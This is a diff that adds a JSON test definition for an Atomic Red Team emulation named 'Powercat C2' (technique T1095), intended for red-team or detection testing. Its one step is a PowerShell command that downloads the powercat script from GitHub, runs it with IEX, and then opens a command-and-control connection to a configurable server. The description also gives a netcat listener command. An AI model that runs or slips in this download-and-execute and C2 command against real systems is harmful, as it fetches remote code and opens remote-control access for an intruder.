@@ -1,0 +1,37 @@
+{
+  "id": "3e0e0e7f-6aa2-4a61-b61d-526c2cc9330e",
+  "name": "Powercat C2",
+  "description": "Start C2 Session Using Powercat\nTo start the listener on a Linux device, type the following: \nnc -l -p \u003cport\u003e\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "58079a5b-52eb-4d03-9579-9efc75fc86da",
+      "type": "execute-command",
+      "data": {
+        "command": "IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')\npowercat -c #{server_ip} -p #{server_port}\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1095",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "server_port",
+      "type": "integer",
+      "description": "The port for the C2 connection",
+      "value": "80"
+    },
+    {
+      "name": "server_ip",
+      "type": "string",
+      "description": "The IP address or domain name of the listening server",
+      "value": "127.0.0.1"
+    }
+  ]
+}
